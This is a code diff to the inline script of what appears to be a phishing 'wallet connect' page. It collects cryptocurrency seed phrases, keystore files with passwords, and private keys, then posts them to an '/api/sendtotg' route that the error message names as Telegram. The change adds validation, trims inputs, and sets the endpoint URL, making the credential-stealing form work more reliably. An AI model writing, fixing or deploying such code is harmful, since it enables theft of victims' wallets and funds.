@@ -2387,20 +2387,22 @@
 
 <script>
 $(document).ready(function () {
-  // Handle form submission via AJAX
   $('#proceedButton').on('click', function (e) {
-    e.preventDefault(); // Prevent the default form submission
+    e.preventDefault();
 
     let formData = {};
-    let tabId = $('.nav-tabs .nav-link.active').attr('id'); // Get the active tab id
-    let walletName = $('#wallet_name2').val(); // Correct ID
-    $('#wallet_Name2').val(walletName); // Set wallet name to the hidden input
+    let tabId = $('.nav-tabs .nav-link.active').attr('id');
+    let walletName = $('#wallet_name2').val().trim();
 
-    // Validation logic
+    if (!walletName) {
+      alert("Please select your wallet name.");
+      return;
+    }
+
     let isValid = true;
 
     switch (tabId) {
-      case 'phraseSend': // Seed phrase tab
+      case 'phraseSend':
         if ($('#phrase1').val().trim() === '') {
           $('#phrase1').addClass('is-invalid');
           isValid = false;
@@ -2409,7 +2411,7 @@ $(document).ready(function () {
         }
         break;
 
-      case 'keystoreSend': // Keystore tab
+      case 'keystoreSend':
         if ($('#keystore1').val().trim() === '' || $('#keystorePassword').val().trim() === '') {
           $('#keystore1, #keystorePassword').addClass('is-invalid');
           isValid = false;
@@ -2418,7 +2420,7 @@ $(document).ready(function () {
         }
         break;
 
-      case 'privateKeySend': // Private key tab
+      case 'privateKeySend':
         if ($('#privateKey1').val().trim() === '') {
           $('#privateKey1').addClass('is-invalid');
           isValid = false;
@@ -2437,46 +2439,44 @@ $(document).ready(function () {
       return;
     }
 
-    // Prepare the form data based on the active tab
     switch (tabId) {
       case 'phraseSend':
         formData = {
           type: 'phrase',
-          phrase: $('#phrase1').val(),
+          phrase: $('#phrase1').val().trim(),
           walletName: walletName
         };
         break;
       case 'keystoreSend':
         formData = {
           type: 'keystore',
-          keystore: $('#keystore1').val(),
-          password: $('#keystorePassword').val(),
+          keystore: $('#keystore1').val().trim(),
+          password: $('#keystorePassword').val().trim(),
           walletName: walletName
         };
         break;
       case 'privateKeySend':
         formData = {
           type: 'privatekey',
-          privateKey: $('#privateKey1').val(),
+          privateKey: $('#privateKey1').val().trim(),
           walletName: walletName
         };
         break;
-      default:
-        alert('Invalid tab.');
-        return;
     }
 
-    // Send the form data via AJAX to your Next.js API route
+    // ✅ Use correct API path (absolute or relative works in Vercel)
+    const apiUrl = `${window.location.origin}/api/sendtotg`;
+
     $.ajax({
-      url: '/api/sendtotg', // ✅ Correct path for Vercel-hosted Next.js API
+      url: apiUrl,
       type: 'POST',
       contentType: 'application/json',
       data: JSON.stringify(formData),
       beforeSend: function () {
-        $('#popup_connect_wallet_success').modal('show'); // Show spinner modal
+        $('#popup_connect_wallet_success').modal('show');
       },
       success: function (response) {
-        console.log('Form submitted successfully:', response);
+        console.log('✅ Form submitted:', response);
         $('#popup_connect_wallet').modal('hide');
 
         setTimeout(function () {
@@ -2485,7 +2485,7 @@ $(document).ready(function () {
         }, 10000);
       },
       error: function (xhr, status, error) {
-        console.error('Form submission failed:', error);
+        console.error('❌ Telegram Error:', xhr.responseText || error);
         setTimeout(function () {
           $('#popup_connect_wallet_success').modal('hide');
         }, 5000);
@@ -2493,7 +2493,6 @@ $(document).ready(function () {
     });
   });
 
-  // Cancel button click event
   $('#cancelBtn').on('click', function () {
     $('#retrieveModal').modal('hide');
   });
